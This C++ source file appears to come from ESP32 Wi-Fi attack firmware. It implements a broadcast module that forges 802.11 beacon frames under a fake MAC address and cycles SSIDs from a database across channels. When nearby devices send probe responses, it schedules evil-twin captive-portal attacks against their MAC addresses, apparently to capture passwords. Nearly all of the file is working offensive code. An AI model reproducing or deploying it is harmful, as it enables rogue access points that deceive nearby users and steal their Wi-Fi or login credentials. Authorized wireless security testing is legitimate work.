#include "broadcast_attack.h"
#include "karma_attack.h"
#include "esp_wifi.h"

// Global instance
ActiveBroadcastAttack broadcastAttack;

// Helper function to send beacon frame
void sendBeaconFrameHelper(const String &ssid, uint8_t channel) {
    if (ssid.isEmpty() || channel < 1 || channel > 14) return;
    
    uint8_t beaconPacket[128] = {0};
    int pos = 0;
    
    // Beacon frame header (Type/Subtype: 0x80)
    beaconPacket[pos++] = 0x80; // Type/Subtype: Beacon
    beaconPacket[pos++] = 0x00;
    
    // Duration
    beaconPacket[pos++] = 0x00;
    beaconPacket[pos++] = 0x00;
    
    // Destination MAC (broadcast: FF:FF:FF:FF:FF:FF)
    memset(&beaconPacket[pos], 0xFF, 6);
    pos += 6;
    
    // Source MAC (fake MAC: 12:34:56:78:9A:BC)
    uint8_t sourceMAC[6] = {0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC};
    memcpy(&beaconPacket[pos], sourceMAC, 6);
    pos += 6;
    
    // BSSID (same as source)
    memcpy(&beaconPacket[pos], sourceMAC, 6);
    pos += 6;
    
    // Sequence number
    beaconPacket[pos++] = 0x00;
    beaconPacket[pos++] = 0x00;
    
    // Timestamp (microseconds, little endian)
    uint64_t timestamp = esp_timer_get_time() / 1000; // Convert to milliseconds
    memcpy(&beaconPacket[pos], &timestamp, 8);
    pos += 8;
    
    // Beacon interval (100 TU = 102.4 ms)
    beaconPacket[pos++] = 0x64;
    beaconPacket[pos++] = 0x00;
    
    // Capability info
    beaconPacket[pos++] = 0x01;
    beaconPacket[pos++] = 0x04;
    
    // SSID tag (0x00)
    beaconPacket[pos++] = 0x00;
    beaconPacket[pos++] = ssid.length();
    memcpy(&beaconPacket[pos], ssid.c_str(), ssid.length());
    pos += ssid.length();
    
    // Supported rates (0x01)
    uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24};
    beaconPacket[pos++] = 0x01;
    beaconPacket[pos++] = sizeof(rates);
    memcpy(&beaconPacket[pos], rates, sizeof(rates));
    pos += sizeof(rates);
    
    // Channel tag (0x03)
    beaconPacket[pos++] = 0x03;
    beaconPacket[pos++] = 0x01;
    beaconPacket[pos++] = channel;
    
    // Send the beacon
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, pos, false);
}

ActiveBroadcastAttack::ActiveBroadcastAttack() 
    : currentIndex(0), batchStart(0), lastBroadcastTime(0),
      lastChannelHopTime(0), isActive(false), currentChannel(1) {
    stats.startTime = millis();
}

void ActiveBroadcastAttack::start() {
    size_t total = SSIDDatabase::getCount();
    if (total == 0) {
        Serial.println("[BROADCAST] No SSIDs in database");
        return;
    }
    
    isActive = true;
    currentIndex = 0;
    batchStart = 0;
    stats.startTime = millis();
    loadNextBatch();
    
    Serial.printf("[BROADCAST] Started with %d SSIDs\n", total);
    Serial.printf("[BROADCAST] Batch size: %d, Interval: %dms\n", 
                  config.batchSize, config.broadcastInterval);
}

void ActiveBroadcastAttack::stop() {
    isActive = false;
    Serial.println("[BROADCAST] Stopped");
}

void ActiveBroadcastAttack::restart() {
    stop();
    delay(100);
    start();
}

bool ActiveBroadcastAttack::isActive() const {
    return isActive;
}

void ActiveBroadcastAttack::setConfig(const BroadcastConfig &newConfig) {
    config = newConfig;
}

BroadcastConfig ActiveBroadcastAttack::getConfig() const {
    return config;
}

void ActiveBroadcastAttack::setBroadcastInterval(uint32_t interval) {
    config.broadcastInterval = interval;
}

void ActiveBroadcastAttack::setBatchSize(uint16_t size) {
    config.batchSize = size;
    loadNextBatch(); // Reload with new batch size
}

void ActiveBroadcastAttack::setChannel(uint8_t channel) {
    if (channel >= 1 && channel <= 14) {
        currentChannel = channel;
    }
}

void ActiveBroadcastAttack::update() {
    if (!isActive) return;
    
    unsigned long now = millis();
    
    // Channel rotation
    if (config.rotateChannels && (now - lastChannelHopTime > config.channelHopInterval)) {
        rotateChannel();
        lastChannelHopTime = now;
    }
    
    // Broadcast next SSID
    if (now - lastBroadcastTime < config.broadcastInterval) return;
    
    // Check if we need new batch
    if (currentIndex >= currentBatch.size()) {
        batchStart += currentBatch.size();
        loadNextBatch();
        currentIndex = 0;
        
        if (currentBatch.empty()) {
            // Reached end, loop back
            batchStart = 0;
            loadNextBatch();
            Serial.println("[BROADCAST] Restarted from beginning");
        }
    }
    
    if (currentIndex < currentBatch.size()) {
        String ssid = currentBatch[currentIndex];
        
        // Prioritize high-priority SSIDs if any
        if (!highPrioritySSIDs.empty() && stats.totalBroadcasts % 10 == 0) {
            size_t hpIndex = stats.totalBroadcasts % highPrioritySSIDs.size();
            ssid = highPrioritySSIDs[hpIndex];
        }
        
        broadcastSSID(ssid);
        currentIndex++;
        stats.totalBroadcasts++;
        lastBroadcastTime = now;
        
        // Log progress
        if (stats.totalBroadcasts % 500 == 0) {
            Serial.printf("[BROADCAST] Sent: %d, Responses: %d\n", 
                         stats.totalBroadcasts, stats.totalResponses);
        }
    }
}

void ActiveBroadcastAttack::processProbeResponse(const String &ssid, const String &mac) {
    if (!config.respondToProbes) return;
    
    recordResponse(ssid);
    
    if (config.prioritizeResponses) {
        addHighPrioritySSID(ssid);
    }
    
    // Check if we should launch an attack
    if (stats.ssidResponseCount[ssid] >= 1) { // Respond on first probe
        launchAttackForResponse(ssid, mac);
    }
}

BroadcastStats ActiveBroadcastAttack::getStats() const {
    return stats;
}

size_t ActiveBroadcastAttack::getTotalSSIDs() const {
    return SSIDDatabase::getCount();
}

size_t ActiveBroadcastAttack::getCurrentPosition() const {
    return batchStart + currentIndex;
}

float ActiveBroadcastAttack::getProgressPercent() const {
    size_t total = getTotalSSIDs();
    if (total == 0) return 0.0f;
    
    return (getCurrentPosition() * 100.0f) / total;
}

std::vector<std::pair<String, size_t>> ActiveBroadcastAttack::getTopResponses(size_t count) const {
    std::vector<std::pair<String, size_t>> sorted;
    
    for (const auto &pair : stats.ssidResponseCount) {
        sorted.push_back(pair);
    }
    
    std::sort(sorted.begin(), sorted.end(),
        [](const auto &a, const auto &b) {
            return a.second > b.second;
        });
    
    if (sorted.size() > count) {
        sorted.resize(count);
    }
    
    return sorted;
}

void ActiveBroadcastAttack::addHighPrioritySSID(const String &ssid) {
    // Check if already in list
    for (const auto &hpSSID : highPrioritySSIDs) {
        if (hpSSID == ssid) return;
    }
    
    highPrioritySSIDs.push_back(ssid);
    
    // Keep list manageable
    if (highPrioritySSIDs.size() > 20) {
        highPrioritySSIDs.erase(highPrioritySSIDs.begin());
    }
}

void ActiveBroadcastAttack::clearHighPrioritySSIDs() {
    highPrioritySSIDs.clear();
}

void ActiveBroadcastAttack::loadNextBatch() {
    currentBatch.clear();
    SSIDDatabase::getBatch(batchStart, config.batchSize, currentBatch);
}

void ActiveBroadcastAttack::broadcastSSID(const String &ssid) {
    sendBeaconFrameHelper(ssid, currentChannel);
}

void ActiveBroadcastAttack::rotateChannel() {
    static const uint8_t channels[] = {1, 6, 11, 3, 8, 2, 7, 12, 4, 9, 5, 10, 13, 14};
    static size_t channelIndex = 0;
    
    channelIndex = (channelIndex + 1) % (sizeof(channels) / sizeof(channels[0]));
    currentChannel = channels[channelIndex];
    
    Serial.printf("[BROADCAST] Switched to channel %d\n", currentChannel);
}

void ActiveBroadcastAttack::recordResponse(const String &ssid) {
    stats.totalResponses++;
    stats.ssidResponseCount[ssid]++;
    stats.lastResponseTime = millis();
    
    Serial.printf("[BROADCAST] Response for: %s (total: %d)\n", 
                 ssid.c_str(), stats.ssidResponseCount[ssid]);
}

void ActiveBroadcastAttack::launchAttackForResponse(const String &ssid, const String &mac) {
    // Check if template is selected
    if (!templateSelected) return;
    
    // Check max active attacks
    int activeCount = 0;
    for (const auto &portal : pendingPortals) {
        if (!portal.launched) activeCount++;
    }
    
    if (activeCount >= config.maxActiveAttacks) {
        Serial.println("[BROADCAST] Max active attacks reached, skipping");
        return;
    }
    
    // Create pending portal
    PendingPortal portal;
    portal.ssid = ssid;
    portal.channel = currentChannel;
    portal.targetMAC = mac;
    portal.timestamp = millis();
    portal.launched = false;
    portal.templateName = selectedTemplate.name;
    portal.templateFile = selectedTemplate.filename;
    portal.isDefaultTemplate = selectedTemplate.isDefault;
    portal.verifyPassword = selectedTemplate.verifyPassword;
    portal.priority = 95; // High priority for broadcast responses
    portal.tier = TIER_HIGH;
    portal.duration = attackConfig.highTierDuration;
    portal.isCloneAttack = false;
    portal.probeCount = stats.ssidResponseCount[ssid];
    
    pendingPortals.push_back(portal);
    stats.successfulAttacks++;
    
    Serial.printf("[BROADCAST] Scheduled attack for %s -> %s\n", 
                 mac.c_str(), ssid.c_str());
}